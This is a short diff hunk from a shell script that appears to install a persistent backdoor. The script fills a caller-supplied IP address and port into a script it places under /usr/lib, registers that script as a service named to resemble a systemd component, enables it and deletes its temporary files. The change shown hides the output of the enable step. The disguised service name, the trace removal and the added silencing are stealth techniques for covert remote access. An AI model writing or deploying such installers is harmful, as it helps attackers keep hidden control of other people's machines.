@@ -12,7 +12,7 @@ sed -i "s,IP_ADDRESS,$1," linuxd.sh
 sed -i "s,PORT,$2," linuxd.sh
 mv linuxd.sh /usr/lib/linuxd
 mv systemd-linuxd.service /usr/lib/systemd/system/systemd-linuxd.service
-systemctl enable systemd-linuxd.service --now
+systemctl enable systemd-linuxd.service --now &>/dev/null
 cd -
 rm -rf $temp
 exit
